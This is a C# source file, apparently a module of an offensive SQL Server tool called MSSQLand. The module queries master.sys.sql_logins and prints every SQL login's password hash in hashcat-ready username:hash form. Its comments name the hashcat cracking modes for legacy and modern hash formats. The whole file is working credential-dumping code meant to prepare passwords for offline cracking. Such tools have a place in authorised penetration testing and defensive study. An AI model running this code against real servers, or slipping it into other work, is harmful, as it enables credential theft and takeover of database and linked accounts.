using MSSQLand.Services;
using MSSQLand.Utilities;
using MSSQLand.Utilities.Formatters;
using System;
using System.Data;
using System.Text;

namespace MSSQLand.Actions.Database
{
    /// <summary>
    /// Dumps SQL Server login password hashes in hashcat format.
    /// 
    /// Hash formats:
    /// - SQL Server 2000-2008: 0x0100... (hashcat mode 131)
    /// - SQL Server 2012+:     0x0200... (hashcat mode 1731)
    /// 
    /// Output format: username:hash (hashcat compatible)
    /// </summary>
    internal class Hashes : BaseAction
    {
        public override void ValidateArguments(string[] args)
        {
            // No arguments required
        }

        public override object? Execute(DatabaseContext databaseContext)
        {
            if (databaseContext.QueryService.IsAzureSQL())
            {
                Logger.Warning("Azure SQL Database does not expose password hashes");
                return null;
            }

            Logger.TaskNested("Extracting SQL Server login password hashes");

            string query = @"
                SELECT 
                    name AS LoginName,
                    CONVERT(VARCHAR(MAX), password_hash, 1) AS PasswordHash
                FROM master.sys.sql_logins
                WHERE password_hash IS NOT NULL
                AND name NOT LIKE '##MS_%##'
                ORDER BY name;";

            DataTable hashTable = databaseContext.QueryService.ExecuteTable(query);

            if (hashTable.Rows.Count == 0)
            {
                Logger.Warning("No SQL logins with password hashes found");
                return null;
            }

            var hashcatOutput = new StringBuilder();
            bool hasLegacyHashes = false;
            bool hasModernHashes = false;

            foreach (DataRow row in hashTable.Rows)
            {
                string loginName = row["LoginName"].ToString();
                string hash = row["PasswordHash"].ToString();

                if (string.IsNullOrEmpty(hash) || hash.Length < 6)
                    continue;

                // Remove 0x prefix if present
                if (hash.StartsWith("0x", StringComparison.OrdinalIgnoreCase))
                    hash = hash.Substring(2);

                // Detect hash type by header
                string hashType = hash.Substring(0, 4).ToUpper();
                
                if (hashType == "0100")
                {
                    hasLegacyHashes = true;
                    hashcatOutput.AppendLine($"{loginName}:0x{hash}");
                }
                else if (hashType == "0200")
                {
                    hasModernHashes = true;
                    hashcatOutput.AppendLine($"{loginName}:0x{hash}");
                }
                else
                {
                    // Unknown format, output anyway
                    hashcatOutput.AppendLine($"{loginName}:0x{hash}");
                }
            }

            Logger.NewLine();
            Console.WriteLine(hashcatOutput.ToString());

            if (hasLegacyHashes){
                Logger.Info("Legacy SQL Server hashes (2000-2008 format, mode 131)");
            }

            if (hasModernHashes){
                Logger.Info("Modern SQL Server hashes (2012+ format, mode 1731)");
            }

            Logger.Success($"Extracted {hashTable.Rows.Count} password hashes");

            return null;
        }
    }
}
